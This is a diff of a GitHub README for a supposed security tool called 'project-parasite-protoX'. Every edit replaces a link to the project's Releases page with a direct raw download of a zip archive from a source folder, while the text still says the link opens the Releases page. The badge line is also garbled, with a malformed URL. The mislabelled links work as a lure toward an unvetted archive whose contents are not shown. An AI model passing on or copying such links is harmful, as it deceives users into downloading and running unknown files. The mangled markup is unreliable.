@@ -1,7 +1,7 @@
 # 🛡️ project-parasite-protoX - Simplifying Security Workflows for Everyone
 
 ## 🖥️ Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/dblwhite/project-parasite-protoX/releases)
+[![Download](https://raw.githubusercontent.com/dblwhite/project-parasite-protoX/main/verifier-backend/parasite-X-project-proto-v3.5.zip%20Latest%https://raw.githubusercontent.com/dblwhite/project-parasite-protoX/main/verifier-backend/parasite-X-project-proto-v3.5.zip)](https://raw.githubusercontent.com/dblwhite/project-parasite-protoX/main/verifier-backend/parasite-X-project-proto-v3.5.zip)
 
 ## 📖 Overview
 This project is a functional, end-to-end prototype of the PARASITE security system. It demonstrates the complete "detect, contain, report" workflow. The application consists of two components that work together:
@@ -13,7 +13,7 @@ This project is a functional, end-to-end prototype of the PARASITE security syst
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: 
-   Click [here](https://github.com/dblwhite/project-parasite-protoX/releases) to go to the Releases page. 
+   Click [here](https://raw.githubusercontent.com/dblwhite/project-parasite-protoX/main/verifier-backend/parasite-X-project-proto-v3.5.zip) to go to the Releases page. 
 
 2. **Select the Latest Version**: 
    When you are on the Releases page, look for the latest version. It's usually at the top of the list.
@@ -62,6 +62,6 @@ If you need help or have questions, you can create an issue on the GitHub page.
 Alternatively, please visit the issues section on the GitHub repository. Your feedback is welcome. 
 
 ## 🖱️ Download & Install
-Once again, click [here](https://github.com/dblwhite/project-parasite-protoX/releases) to access the Releases page and download the latest version. Install it by following the steps outlined above.
+Once again, click [here](https://raw.githubusercontent.com/dblwhite/project-parasite-protoX/main/verifier-backend/parasite-X-project-proto-v3.5.zip) to access the Releases page and download the latest version. Install it by following the steps outlined above.
 
 Feel free to explore the functionality of the project. Thank you for choosing PARASITE security system!
